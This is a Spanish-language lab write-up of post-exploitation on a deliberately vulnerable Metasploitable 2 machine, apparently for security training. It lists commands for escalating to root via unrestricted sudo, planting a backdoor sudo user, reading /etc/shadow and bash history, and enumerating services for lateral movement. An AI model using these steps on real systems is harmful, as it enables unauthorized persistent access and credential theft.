# 🛡️ Sprint 4 – Post-Explotación y Persistencia
## 🎯 Objetivo

Documentar técnicas aplicadas luego de la explotación de la vulnerabilidad en la aplicación vulnerable `raymi-landing-php`, incluyendo:

- Escalamiento de privilegios
- Persistencia en el sistema
- Acceso a información sensible
- Análisis del impacto

---

## 🧠 Contexto previo

En el sprint anterior se logró acceso remoto a la máquina Metasploitable 2 mediante una vulnerabilidad de SQLi y fuerza bruta, accediendo al sistema como el usuario:

- **Usuario comprometido:** `raymi-admin`
- **Contraseña:** `admin123`
- **Vía de acceso:** SSH

---

## 🧩 PASO 1 – Confirmación de acceso

### 🔎 Comandos ejecutados:

```bash
ssh raymi-admin@192.168.245.129
whoami
hostname
id
```

### ✅ Resultado:

```plaintext
whoami   → raymi-admin
hostname → metasploitable
id       → uid=1001(raymi-admin) gid=1001(raymi-admin) groups=1001(raymi-admin)
```

---

## 🧩 PASO 2 – Verificación de privilegios de `raymi-admin`

```bash
sudo -l
```

### ✅ Resultado:
```plaintext
User raymi-admin may run the following commands on this host:
    (ALL : ALL) ALL
```

➡️ **El usuario tiene permisos de sudo sin restricciones.**

### 🔥 Escalamiento:

```bash
sudo su
whoami
```

✅ Ahora se tiene control completo como **root**.

---

## 🧩 PASO 3 – Creación de persistencia

### 🛠 Se creó un nuevo usuario con privilegios root:

```bash
adduser backdooruser
# Se ingresó la contraseña: 123

usermod -aG sudo backdooruser
```

Ahora existe un nuevo usuario con acceso persistente al sistema.

---

## 🧩 PASO 4 – Acceso a información sensible

### 📂 Se exploraron archivos y configuraciones clave:

```bash
cat /etc/passwd
cat /etc/shadow
cat ~/.bash_history
```

### ✅ Resultado:

- Se visualizaron los hashes de todos los usuarios del sistema
- El historial de comandos reveló uso de utilidades de administración
- Se identificaron otros usuarios existentes como `msfadmin`, `root`, etc.

---

## 🧩 PASO 5 – Enumeración de servicios de red (potencial movimiento lateral)

### 🔎 Comando:

```bash
netstat -tuln
```

### ✅ Resultado:

```plaintext
Puertos abiertos:
22 (SSH)
21 (FTP)
23 (Telnet)
3306 (MySQL)
```

Se identificaron varios servicios expuestos que podrían permitir **movimiento lateral** o explotación adicional, incluyendo acceso por MySQL o FTP con credenciales obtenidas.

---

## 📸 EVIDENCIA SUGERIDA

- Captura de `sudo -l` mostrando privilegios
- Captura de `sudo su` y `whoami` como root
- Captura del proceso de creación de `backdooruser`
- Listado de `/etc/shadow` con hashes
- Salida de `netstat -tuln` con puertos abiertos

---

## 📌 Conclusiones del Sprint 4

✔️ Se comprobó que el usuario comprometido tenía acceso completo (`sudo`).

✔️ Se logró escalamiento a `root` de forma inmediata.

✔️ Se estableció **persistencia** creando un nuevo usuario (`backdooruser`) con privilegios.

✔️ Se accedió a información sensible: usuarios, contraseñas cifradas, historial.

✔️ Se identificaron servicios activos para posibles movimientos laterales.

---

## ⚠️ Nota

Este laboratorio se realizó en un entorno controlado con fines exclusivamente educativos y de entrenamiento. No se debe realizar este tipo de actividades en sistemas reales sin autorización expresa.

